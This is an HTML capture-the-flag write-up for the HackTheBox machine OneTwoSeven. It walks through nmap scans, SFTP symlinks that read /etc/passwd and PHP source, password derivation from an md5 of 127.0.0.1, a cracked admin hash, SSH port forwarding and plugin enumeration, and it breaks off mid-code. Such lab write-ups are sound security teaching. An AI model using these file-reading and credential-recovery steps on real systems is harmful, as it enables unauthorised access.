@@ -1,0 +1,1142 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>pwncone.io</title>
+    <link rel="stylesheet" href="../../../../css/style.css">
+  </head>
+
+<body>
+
+<section>
+
+    <writeup>
+        <h1><strong>hackthebox OneTwoSeven</strong></h1>
+        <em>Released: 20th April 2019 / Pwned: July 3rd 2019 - [+] Solved whilst Active</em><br>
+        <br>
+        <img alt="images\2-1.png" src="images/2-1.png"><br>
+        <br>
+        This box was really good. There were no CTF shenanigans, no brute-forcing, no excessive reliance on tools. Everything you needed was right there in front of you. The ‘hard’ characteristic of this box is that all of your exploits have to be precise and well-thought-out. And root is entirely up to you.<br>
+        <br>
+        <a id="h3-1" name="h3-1"></a><strong></strong>
+        <h4><strong>Summary</strong></h4>
+        • Find credentials to login via SFTP on website<br>
+        • symlink to read files outside of our SFTP directory<br>
+        • Find login credentials to admin panel and information on how to access it<br>
+        • Port forward an initially unknown port and access admin panel<br>
+        • Upload plugin via <code>addon-download.php</code> and get reverse shell<br>
+        • Create a malicious, "upgraded" version of an existing debian package on the system<br>
+        • Create a fake package repository and serve the malicious package via Apache<br>
+        • Get root!<br>
+        <br>
+        <a id="h2-1" name="h2-1"></a><strong></strong>
+        <h2><strong>1) Nmap</strong></h2><br>
+        Initial scan:<br>
+        <code>nmap -sC -sV -O -oN nmap/initial.txt 10.10.10.133</code><br>
+        <br>
+        -sC default scripts<br>
+        -sV service enumeration<br>
+        -O OS detection<br>
+        -oN default output<br>
+        <br>
+        Results:<br>
+            <div class="codebox">
+                root@gotham:~/ctf/onetwoseven#&nbsp;mkdir&nbsp;nmap<br>
+                root@gotham:~/ctf/onetwoseven#&nbsp;nmap&nbsp;-sC&nbsp;-sV&nbsp;-O&nbsp;-oN&nbsp;nmap/initial.txt&nbsp;10.10.10.133<br>
+                ...<br>
+                Host&nbsp;is&nbsp;up&nbsp;(0.040s&nbsp;latency).<br>
+                Not&nbsp;shown:&nbsp;998&nbsp;closed&nbsp;ports<br>
+                PORT&nbsp;&nbsp;&nbsp;STATE&nbsp;SERVICE&nbsp;VERSION<br>
+                22/tcp&nbsp;open&nbsp;&nbsp;ssh&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OpenSSH&nbsp;7.4p1&nbsp;Debian&nbsp;10+deb9u6&nbsp;(protocol&nbsp;2.0)<br>
+                |&nbsp;ssh-hostkey:&nbsp;<br>
+                |&nbsp;&nbsp;&nbsp;2048&nbsp;48:6c:93:34:16:58:05:eb:9a:e5:5b:96:b6:d5:14:aa&nbsp;(RSA)<br>
+                |&nbsp;&nbsp;&nbsp;256&nbsp;32:b7:f3:e2:6d:ac:94:3e:6f:11:d8:05:b9:69:58:45&nbsp;(ECDSA)<br>
+                |_&nbsp;&nbsp;256&nbsp;35:52:04:dc:32:69:1a:b7:52:76:06:e3:6c:17:1e:ad&nbsp;(ED25519)<br>
+                80/tcp&nbsp;open&nbsp;&nbsp;http&nbsp;&nbsp;&nbsp;&nbsp;Apache&nbsp;httpd&nbsp;2.4.25&nbsp;((Debian))<br>
+                |_http-server-header:&nbsp;Apache/2.4.25&nbsp;(Debian)<br>
+                |_http-title:&nbsp;Page&nbsp;moved.<br>
+                No&nbsp;exact&nbsp;OS&nbsp;matches&nbsp;for&nbsp;host&nbsp;(If&nbsp;you&nbsp;know&nbsp;what&nbsp;OS&nbsp;is&nbsp;running&nbsp;on&nbsp;it,&nbsp;see&nbsp;https://nmap.org/submit/&nbsp;).<br>
+                ...
+            </div>
+        </div><br>
+        <br>
+        An all-ports scan reveals 1 extra port - <code>60080</code><br>
+            <div class="codebox">
+                root@gotham:~/ctf/onetwoseven#&nbsp;nmap&nbsp;-p-&nbsp;-sV&nbsp;-T4&nbsp;-oN&nbsp;nmap/full.txt&nbsp;10.10.10.133<br>
+                ...<br>
+                Host&nbsp;is&nbsp;up&nbsp;(0.064s&nbsp;latency).<br>
+                Not&nbsp;shown:&nbsp;65532&nbsp;closed&nbsp;ports<br>
+                PORT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;STATE&nbsp;&nbsp;&nbsp;&nbsp;SERVICE&nbsp;VERSION<br>
+                22/tcp&nbsp;&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ssh&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OpenSSH&nbsp;7.4p1&nbsp;Debian&nbsp;10+deb9u6&nbsp;(protocol&nbsp;2.0)<br>
+                80/tcp&nbsp;&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;http&nbsp;&nbsp;&nbsp;&nbsp;Apache&nbsp;httpd&nbsp;2.4.25&nbsp;((Debian))<br>
+                60080/tcp&nbsp;filtered&nbsp;unknown<br>
+                Service&nbsp;Info:&nbsp;OS:&nbsp;Linux;&nbsp;CPE:&nbsp;cpe:/o:linux:linux_kernel<br>
+                ...
+            </div>
+        </div><br>
+        <br>
+        <strong>Services running:</strong><br>
+        • 22/ssh - nothing to do here for the time being<br>
+        • 80/http - there's a website running<br>
+        • 60080/? - nmap isn't sure what's running on this port<br>
+        <br>
+        <a id="h1-2" name="h1-2"></a><strong></strong>
+        <h1><strong>Ports &amp; Services</strong></h1>
+        <br>
+        <a id="h2-2" name="h2-2"></a><strong></strong>
+        <h2><strong>2) 80/http - onetwoseven.htb</strong></h2><br>
+        <code>http://10.10.10.133/</code><br>
+        <img alt="images\2-2.png" src="images/2-2.png"><br>
+        <br>
+        The website is advertising web hosting.<br>
+        If we sign up, we're given a username and password to sign in via <code>sftp</code>.<br>
+        <code>http://10.10.10.133/signup.php</code><br>
+        <img alt="images\2-3.png" src="images/2-3.png"><br>
+        <br>
+        SFTP login:<br>
+        <code>ots-mM2Y3Y2U / 41f3f7ce</code><br>
+        <br>
+        And, as stated, we can visit our homepage here - <code>http://onetwoseven.htb/~ots-mM2Y3Y2U/</code><br>
+        <br>
+        Log in to SFTP and have a look around.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/onetwoseven#&nbsp;sftp&nbsp;ots-mM2Y3Y2U@10.10.10.133<br>
+                ots-mM2Y3Y2U@10.10.10.133's&nbsp;password:&nbsp;<br>
+                Connected&nbsp;to&nbsp;ots-mM2Y3Y2U@10.10.10.133.<br>
+                sftp&gt;&nbsp;ls<br>
+                public_html&nbsp;&nbsp;<br>
+                sftp&gt;&nbsp;cd&nbsp;public_html/<br>
+                sftp&gt;&nbsp;ls<br>
+                index.html&nbsp;&nbsp;&nbsp;<br>
+                sftp&gt;&nbsp;<br>
+                Available&nbsp;commands:<br>
+                bye&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Quit&nbsp;sftp<br>
+                cd&nbsp;path&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Change&nbsp;remote&nbsp;directory&nbsp;to&nbsp;'path'<br>
+                chgrp&nbsp;grp&nbsp;path&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Change&nbsp;group&nbsp;of&nbsp;file&nbsp;'path'&nbsp;to&nbsp;'grp'<br>
+                ...
+            </div>
+        </div><br>
+        <br>
+        Nothing interesting here :/<br>
+        <br>
+        <a id="h3-2" name="h3-2"></a><strong></strong>
+        <h3><strong>2a) symlink /etc/passwd</strong></h3><br>
+        Using <code>symlink</code>, we can retrieve files outside of our sftp directory.<br>
+        Have a look at <code>/etc/passwd</code><br>
+            <div class="codebox">
+                sftp&gt;&nbsp;symlink&nbsp;/etc/passwd&nbsp;sym1.txt<br>
+                sftp&gt;&nbsp;ls&nbsp;-l<br>
+                -rw-r--r--&nbsp;&nbsp;&nbsp;&nbsp;1&nbsp;1001&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1001&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;349&nbsp;Feb&nbsp;15&nbsp;21:03&nbsp;index.html<br>
+                lrwxrwxrwx&nbsp;&nbsp;&nbsp;&nbsp;1&nbsp;1001&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1001&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;11&nbsp;Jul&nbsp;&nbsp;3&nbsp;16:54&nbsp;sym1.txt
+            </div>
+        </div><br>
+        <br>
+        And view the file here - <code>http://onetwoseven.htb/~ots-mM2Y3Y2U/sym1.txt</code><br>
+        <img alt="images\2-4.png" src="images/2-4.png"><br>
+        <br>
+        <a id="h3-3" name="h3-3"></a><strong></strong>
+        <h3><strong>2b) symlink /home</strong></h3><br>
+        The localhost user from <code>/etc/passwd</code> looks interesting.<br>
+        <code>symlink</code> their <code>/home</code> directory, as shown in <code>/etc/passwd</code>, and have a look.<br>
+            <div class="codebox">
+                sftp&gt;&nbsp;symlink&nbsp;/home/web/ots-yODc2NGQ&nbsp;sym2.txt
+            </div>
+        </div><br>
+        <br>
+        <img alt="images\2-5.png" src="images/2-5.png"><br>
+        <br>
+        But we don't have permissions to read <code>user.txt</code> :/<br>
+        <img alt="images\2-6.png" src="images/2-6.png"><br>
+        <br>
+        <a id="h3-4" name="h3-4"></a><strong></strong>
+        <h3><strong>2c) symlink /var/www/html/signup.php - user.txt</strong></h3><br>
+        <code>http://10.10.10.133/signup.php</code> is the web page that provides you with your login credentials<br>
+        If you grab the <code>http://10.10.10.133/signup.php</code> page via <code>symlink</code> you'll be able to read the php source code of that page.<br>
+        <br>
+        On that page, you'll find the algorithms that generate the SFTP usernames and passwords.<br>
+            <div class="codebox">
+                sftp&gt;&nbsp;symlink&nbsp;/var/www/html/signup.php&nbsp;sym3.txt
+            </div>
+        </div><br>
+        <br>
+        <img alt="images\2-7.png" src="images/2-7.png"><br>
+        <br>
+            <div class="codebox">
+                <span style="color:#ff9d00;font-weight:700">&lt;?php</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">function</span>&nbsp;username<span style="color:#ff9d00;font-weight:400">()</span>&nbsp;{&nbsp;<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#333333;font-weight:400">$ip</span>&nbsp;<span style="color:#ff9d00;font-weight:400">=</span>&nbsp;<span style="color:#333333;font-weight:400">$_SERVER[</span><span style="color:#3ad900;font-weight:400">'REMOTE_ADDR'</span><span style="color:#333333;font-weight:400">]</span><span style="color:#ff9d00;font-weight:400">;</span>&nbsp;<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">return</span>&nbsp;<span style="color:#3ad900;font-weight:400">"ots-"</span>&nbsp;<span style="color:#ff9d00;font-weight:400">.</span>&nbsp;substr<span style="color:#ff9d00;font-weight:400">(</span>str_replace<span style="color:#ff9d00;font-weight:400">(</span><span style="color:#3ad900;font-weight:400">'='</span><span style="color:#ff9d00;font-weight:400">,</span><span style="color:#3ad900;font-weight:400">''</span><span style="color:#ff9d00;font-weight:400">,</span>base64_encode<span style="color:#ff9d00;font-weight:400">(</span>substr<span style="color:#ff9d00;font-weight:400">(</span>md5<span style="color:#ff9d00;font-weight:400">(</span><span style="color:#333333;font-weight:400">$ip</span><span style="color:#ff9d00;font-weight:400">),</span><span style="color:#ff0044;font-weight:400">0</span><span style="color:#ff9d00;font-weight:400">,</span><span style="color:#ff0044;font-weight:400">8</span><span style="color:#ff9d00;font-weight:400">))),</span><span style="color:#ff0044;font-weight:400">3</span><span style="color:#ff9d00;font-weight:400">);</span>&nbsp;<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;}<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">function</span>&nbsp;password<span style="color:#ff9d00;font-weight:400">()</span>&nbsp;{&nbsp;<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#333333;font-weight:400">$ip</span>&nbsp;<span style="color:#ff9d00;font-weight:400">=</span>&nbsp;<span style="color:#333333;font-weight:400">$_SERVER[</span><span style="color:#3ad900;font-weight:400">'REMOTE_ADDR'</span><span style="color:#333333;font-weight:400">]</span><span style="color:#ff9d00;font-weight:400">;</span>&nbsp;<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">return</span>&nbsp;substr<span style="color:#ff9d00;font-weight:400">(</span>md5<span style="color:#ff9d00;font-weight:400">(</span><span style="color:#333333;font-weight:400">$ip</span><span style="color:#ff9d00;font-weight:400">),</span><span style="color:#ff0044;font-weight:400">0</span><span style="color:#ff9d00;font-weight:400">,</span><span style="color:#ff0044;font-weight:400">8</span><span style="color:#ff9d00;font-weight:400">);</span>&nbsp;<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;}<br>
+                <span style="color:#ff9d00;font-weight:700">?&gt;</span>
+            </div>
+        </div><br>
+        <br>
+        The <code>password()</code> function creates an md5 hash of the remote connection's IP address and returns the first 8 characters of it:<br>
+        <code>$ip = $_SERVER['REMOTE_ADDR'];</code> <strong><code>return substr(md5($ip),0,8)</code></strong><code>;</code><br>
+        <br>
+        We know from symlink-ing <code>/etc/passwd</code> earlier that the <code>ots-yODc2NGQ</code> connection is from <code>127.0.0.1</code><br>
+        An md5 hash of <code>127.0.0.1</code> is <code>f528764d624db129b32c21fbca0cb8d6</code><br>
+        The first 8 characters of that are <code>f528764d</code><br>
+        <br>
+        The credentials for <code>ots-yODc2NGQ</code> are:<br>
+        <code>ots-yODc2NGQ / f528764d</code><br>
+        <br>
+        Log in as <code>ots-yODc2NGQ</code> via sftp and grab <code>user.txt</code><br>
+            <div class="codebox">
+                root@gotham:~/ctf/onetwoseven/sftp#&nbsp;sftp&nbsp;ots-yODc2NGQ@onetwoseven.htb<br>
+                ots-yODc2NGQ@onetwoseven.htb's&nbsp;password:&nbsp;f528764d<br>
+                Connected&nbsp;to&nbsp;ots-yODc2NGQ@onetwoseven.htb.<br>
+                sftp&gt;&nbsp;ls<br>
+                public_html&nbsp;&nbsp;user.txt&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                sftp&gt;&nbsp;get&nbsp;user.txt<br>
+                Fetching&nbsp;/user.txt&nbsp;to&nbsp;user.txt<br>
+                /user.txt&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;100%&nbsp;&nbsp;&nbsp;33&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0.4KB/s&nbsp;&nbsp;&nbsp;00:00&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                sftp&gt;&nbsp;exit<br>
+                root@gotham:~/ctf/onetwoseven/sftp#&nbsp;cat&nbsp;user.txt<br>
+                93a4ce6...
+            </div>
+        </div><br>
+        <br>
+        <a id="h3-5" name="h3-5"></a><strong></strong>
+        <h3><strong>2d) symlink /var/www/html</strong></h3><br>
+        There are hints at an Admin panel on the homepage but it doesn't seem to be accessible.<br>
+        <img alt="images\2-8.png" src="images/2-8.png"><br>
+        <br>
+        <code>symlink</code> the web root directory - <code>/var/www/</code> - and have a look at the files on the website.<br>
+            <div class="codebox">
+                sftp&gt;&nbsp;symlink&nbsp;/var/www&nbsp;sym4.txt
+            </div>
+        </div><br>
+        <br>
+        <code>html-admin</code> looks interesting.<br>
+        <img alt="images\2-9.png" src="images/2-9.png"><br>
+        <br>
+        As does <code>.login.php.swp</code><br>
+        <img alt="images\2-10.png" src="images/2-10.png"><br>
+        <br>
+        <a id="h3-6" name="h3-6"></a><strong></strong>
+        <h3><strong>2e) .login.php.swp</strong></h3><br>
+        Examine <code>.login.php.swp</code> using <code>strings</code> to eliminate the garbage.<br>
+            <div class="codebox">
+                root@gotham:~/Downloads#&nbsp;strings&nbsp;login.php.swp&nbsp;<br>
+                b0VIM&nbsp;8.0<br>
+                u\k*<br>
+                root<br>
+                onetwoseven<br>
+                /var/www/html-admin/login.php<br>
+                ...
+            </div>
+        </div><br>
+        <br>
+        We find a username and password hash:<br>
+            <div class="codebox">
+                <span style="color:#ff9d00;font-weight:700">&lt;?php</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;<span style="color:#ff9d00;font-weight:400">(</span><span style="color:#333333;font-weight:400">$_POST[</span><span style="color:#3ad900;font-weight:400">'username'</span><span style="color:#333333;font-weight:400">]</span>&nbsp;<span style="color:#ff9d00;font-weight:400">==</span>&nbsp;<span style="color:#3ad900;font-weight:400">'ots-admin'</span>&nbsp;<span style="color:#ff9d00;font-weight:400">&amp;&amp;</span>&nbsp;hash<span style="color:#ff9d00;font-weight:400">(</span><span style="color:#3ad900;font-weight:400">'sha256'</span><span style="color:#ff9d00;font-weight:400">,</span><span style="color:#333333;font-weight:400">$_POST[</span><span style="color:#3ad900;font-weight:400">'password'</span><span style="color:#333333;font-weight:400">]</span><span style="color:#ff9d00;font-weight:400">)</span>&nbsp;<span style="color:#ff9d00;font-weight:400">==</span>&nbsp;<span style="color:#3ad900;font-weight:400">'11c5a42c9d74d5442ef3cc835bda1b3e7cc7f494e704a10d0de426b2fbe5cbd8'</span><span style="color:#ff9d00;font-weight:400">)</span>&nbsp;{<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;<span style="color:#ff9d00;font-weight:400">(</span>isset<span style="color:#ff9d00;font-weight:400">(</span><span style="color:#333333;font-weight:400">$_POST[</span><span style="color:#3ad900;font-weight:400">'login'</span><span style="color:#333333;font-weight:400">]</span><span style="color:#ff9d00;font-weight:400">)</span>&nbsp;<span style="color:#ff9d00;font-weight:400">&amp;&amp;</span>&nbsp;<span style="color:#ff9d00;font-weight:400">!empty(</span><span style="color:#333333;font-weight:400">$_POST[</span><span style="color:#3ad900;font-weight:400">'username'</span><span style="color:#333333;font-weight:400">]</span><span style="color:#ff9d00;font-weight:400">)</span>&nbsp;<span style="color:#ff9d00;font-weight:400">&amp;&amp;</span>&nbsp;<span style="color:#ff9d00;font-weight:400">!empty(</span><span style="color:#333333;font-weight:400">$_POST[</span><span style="color:#3ad900;font-weight:400">'password'</span><span style="color:#333333;font-weight:400">]</span><span style="color:#ff9d00;font-weight:400">))</span>&nbsp;{<br>
+                <span style="color:#ff9d00;font-weight:700">?&gt;</span>
+            </div>
+        </div><br>
+        <br>
+        <code>ots-admin / 11c5a42c9d74d5442ef3cc835bda1b3e7cc7f494e704a10d0de426b2fbe5cbd8</code><br>
+        <br>
+        I cracked <code>11c5a42c9d74d5442ef3cc835bda1b3e7cc7f494e704a10d0de426b2fbe5cbd8</code> using hashkiller.co.uk.<br>
+        Go for the low-hanging fruit :)<br>
+        <br>
+        <a href="https://hashkiller.co.uk/Cracker/SHA256">https://hashkiller.co.uk/Cracker/SHA256</a><br>
+        <img alt="images\2-11.png" src="images/2-11.png"><br>
+        <br>
+        The credentials for <code>login.php</code> are:<br>
+        <code>ots-admin / Homesweethome1</code><br>
+        <br>
+        We also find that <code>login.php</code> is running on port 60080, the unknown port that nmap found.<br>
+            <div class="codebox">
+                <span style="color:#ff9d00;font-weight:700">&lt;?php</span>&nbsp;<br>
+                <span style="color:#ff9d00;font-weight:700">if</span>&nbsp;<span style="color:#ff9d00;font-weight:400">(</span>&nbsp;<span style="color:#333333;font-weight:400">$_SERVER[</span><span style="color:#3ad900;font-weight:400">'SERVER_PORT'</span><span style="color:#333333;font-weight:400">]</span>&nbsp;<span style="color:#ff9d00;font-weight:400">!=</span>&nbsp;<span style="color:#ff0044;font-weight:400">60080</span>&nbsp;<span style="color:#ff9d00;font-weight:400">)</span>&nbsp;{&nbsp;<br>
+                <span style="color:#ff9d00;font-weight:700">die();</span>&nbsp;<br>
+                }&nbsp;<br>
+                <span style="color:#ff9d00;font-weight:700">?&gt;</span>
+            </div>
+        </div><br>
+        <br>
+        <a id="h2-3" name="h2-3"></a><strong></strong>
+        <h2><strong>3) 60080/http - Port Forwarding</strong></h2><br>
+        The 60080 port simply times-out when you try to access it.<br>
+        Given the name of the box - OneTwoSeven - try port forwarding 60080 to localhost port 60080 instead, and access the page from there.<br>
+        <br>
+        We can use ssh for this. However, ssh'ing in as a user is disabled on this machine so to keep our port-forward alive we need to tell ssh not to create a shell on the system using the <code>-nNT</code> flag.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/onetwoseven#&nbsp;ssh&nbsp;ots-yODc2NGQ@10.10.10.133&nbsp;-L&nbsp;60080:127.0.0.1:60080&nbsp;-nNT<br>
+                ots-yODc2NGQ@10.10.10.133's&nbsp;password:&nbsp;f528764d
+            </div>
+        </div><br>
+        <br>
+        SSH should hang.<br>
+        Now you can visit <code>http://127.0.0.1:60080/</code> to get to the login page.<br>
+        <img alt="images\2-12.png" src="images/2-12.png"><br>
+        <br>
+        We're on the administrator backend!<br>
+        <br>
+        Log in using the credentials from earlier.<br>
+        <code>ots-admin / Homesweethome1</code><br>
+        <br>
+        <a id="h3-7" name="h3-7"></a><strong></strong>
+        <h3><strong>3a) http://127.0.0.1:60080/menu.php</strong></h3><br>
+        Upon login, we get redirected to <code>/menu.php</code><br>
+        <img alt="images\2-13.png" src="images/2-13.png"><br>
+        <br>
+        There's a bunch of plugins available to us which, judging by their names and the output of <code>ots-users.php</code> that I ran, these “plugins� are running system commands.<br>
+        <br>
+        There's also a <em>Plugin Upload</em> functionality that's currently disabled.<br>
+        <br>
+        <a id="h3-8" name="h3-8"></a><strong></strong>
+        <h3><strong>3b) Configure Burp to work with localhost/127.0.0.1</strong></h3><br>
+        To have Burp work with this port forwarded site, remove <code>localhost</code> and <code>127.0.0.1</code> from the ‘No proxy for’ option in Firefox's proxy settings.<br>
+        <br>
+        <img alt="images\2-14.png" src="images/2-14.png"><br>
+        <br>
+        <br>
+        <a id="h2-4" name="h2-4"></a><strong></strong>
+        <h2><strong>4) Manually Enumerate :60080/menu.php</strong></h2><br>
+        You should browse through this site manually, there's lots to take in.<br>
+        Be observant. Gather as much information as you can about how this page works and what it's doing.<br>
+        <br>
+        <a id="h3-9" name="h3-9"></a><strong></strong>
+        <h3><strong>4a) OTS Addon Manager</strong></h3><br>
+        Run the OTS Addon Manager plugin<br>
+        <img alt="images\2-15.png" src="images/2-15.png"><br>
+        <br>
+        The output of this plugin tells us that the add-on manager, <code>ots-man-addon.php</code>, can't be accessed directly.<br>
+        Instead, it can only be accessed by visiting <code>addon-upload.php</code> or <code>addon-download.php</code>.<br>
+        <br>
+        <a id="h3-10" name="h3-10"></a><strong></strong>
+        <h3><strong>4b) addons/ subdirectory</strong></h3><br>
+        If you look at the URL when running a plugin you'll notice that it's running the php script from a subdirectory called <code>addons</code>.<br>
+        <img alt="images\2-16.png" src="images/2-16.png"><br>
+        <br>
+        <code>http://127.0.0.1:60080/addons/</code> lists all the plugins that are available on the homepage.<br>
+        <img alt="images\2-17.png" src="images/2-17.png"><br>
+        <br>
+        If you navigate to any of these plugins, the script won't run.<br>
+        Take a mental note of that.<br>
+        <br>
+        <a id="h3-11" name="h3-11"></a><strong></strong>
+        <h3><strong>4c) Find</strong></h3><strong><code></code></strong>
+        <h3><strong><code>addon-download.php</code></strong></h3><strong></strong>
+        <h3><strong>URL and Get Plugin Template</strong></h3><br>
+        Download the source code of a plugin using the <code>[DL]</code> link next to the plugin on the admin panel.<br>
+        I downloaded the source code of <code>OTS System Users</code>.<br>
+        <img alt="images\2-18.png" src="images/2-18.png"><br>
+        <br>
+        If you right-click &gt; Copy Link Location you'll find the URL that's downloading the script:<br>
+        <code>http://127.0.0.1:60080/addon-download.php?addon=ots-sysusers.php</code><br>
+        <br>
+        <img alt="images\2-19.png" src="images/2-19.png"><br>
+        <br>
+        By reading the source code of the plugin you'll find that all the plugin does is confirm what we thought earlier.<br>
+        It runs shell commands using the <code>shell_exec</code> function.<br>
+            <div class="codebox">
+                <span style="color:#ff9d00;font-weight:700">&lt;?php</span>&nbsp;session_start<span style="color:#ff9d00;font-weight:400">();</span>&nbsp;<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;<span style="color:#ff9d00;font-weight:400">(!</span>isset&nbsp;<span style="color:#ff9d00;font-weight:400">(</span><span style="color:#333333;font-weight:400">$_SESSION[</span><span style="color:#3ad900;font-weight:400">'username'</span><span style="color:#333333;font-weight:400">]</span><span style="color:#ff9d00;font-weight:400">))</span>&nbsp;{&nbsp;header<span style="color:#ff9d00;font-weight:400">(</span><span style="color:#3ad900;font-weight:400">"Location:&nbsp;/login.php"</span><span style="color:#ff9d00;font-weight:400">);</span>&nbsp;}<span style="color:#ff9d00;font-weight:400">;</span>&nbsp;<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;<span style="color:#ff9d00;font-weight:400">(</span>&nbsp;strpos<span style="color:#ff9d00;font-weight:400">(</span><span style="color:#333333;font-weight:400">$_SERVER[</span><span style="color:#3ad900;font-weight:400">'REQUEST_URI'</span><span style="color:#333333;font-weight:400">]</span><span style="color:#ff9d00;font-weight:400">,</span>&nbsp;<span style="color:#3ad900;font-weight:400">'/addons/'</span><span style="color:#ff9d00;font-weight:400">)</span>&nbsp;<span style="color:#ff9d00;font-weight:400">!==</span>&nbsp;<span style="color:#ff0044;font-weight:400">false</span>&nbsp;<span style="color:#ff9d00;font-weight:400">)</span>&nbsp;{&nbsp;<span style="color:#ff9d00;font-weight:700">die();</span>&nbsp;}<span style="color:#ff9d00;font-weight:400">;</span><br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;OneTwoSeven&nbsp;Admin&nbsp;Plugin</span><br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;OTS&nbsp;System&nbsp;Users</span><br>
+                <span style="color:#ff9d00;font-weight:700">echo</span>&nbsp;shell_exec<span style="color:#ff9d00;font-weight:400">(</span><span style="color:#3ad900;font-weight:400">"/usr/bin/w&nbsp;-s&nbsp;|&nbsp;/usr/bin/tail&nbsp;+2"</span><span style="color:#ff9d00;font-weight:400">);</span><br>
+                <span style="color:#ff9d00;font-weight:700">?&gt;</span>
+            </div>
+        </div><br>
+        <br>
+        <a id="h3-12" name="h3-12"></a><strong></strong>
+        <h3><strong>4d) Read OTS Addon Manager source code</strong></h3><br>
+        Download the OTS Addon Manager source code from the admin panel homepage.<br>
+        <code>http://localhost:60080/addon-download.php?addon=ots-man-addon.php</code><br>
+        <img alt="images\2-20.png" src="images/2-20.png"><br>
+        <br>
+        Open the file and you'll see the source code for the <code>addon-upload.php</code> plugin.<br>
+            <div class="codebox">
+                <span style="color:#ff9d00;font-weight:700">&lt;?php</span><br>
+                <span style="color:#ff9d00;font-weight:400">...</span><br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;Upload&nbsp;addon&nbsp;to&nbsp;addons&nbsp;folder.</span><br>
+                <span style="color:#ff9d00;font-weight:700">case</span>&nbsp;preg_match<span style="color:#ff9d00;font-weight:400">(</span><span style="color:#3ad900;font-weight:400">'/\/addon-upload.php/'</span><span style="color:#ff9d00;font-weight:400">,</span><span style="color:#333333;font-weight:400">$_SERVER[</span><span style="color:#3ad900;font-weight:400">'REQUEST_URI'</span><span style="color:#333333;font-weight:400">]</span><span style="color:#ff9d00;font-weight:400">):</span><br>
+                <span style="color:#ff9d00;font-weight:700">if(</span>isset<span style="color:#ff9d00;font-weight:400">(</span><span style="color:#333333;font-weight:400">$_FILES[</span><span style="color:#3ad900;font-weight:400">'addon'</span><span style="color:#333333;font-weight:400">]</span><span style="color:#ff9d00;font-weight:400">))</span>{<br>
+                <span style="color:#333333;font-weight:400">$errors</span><span style="color:#ff9d00;font-weight:400">=</span>&nbsp;<span style="color:#7f0044;font-weight:400">array</span><span style="color:#ff9d00;font-weight:400">();</span><br>
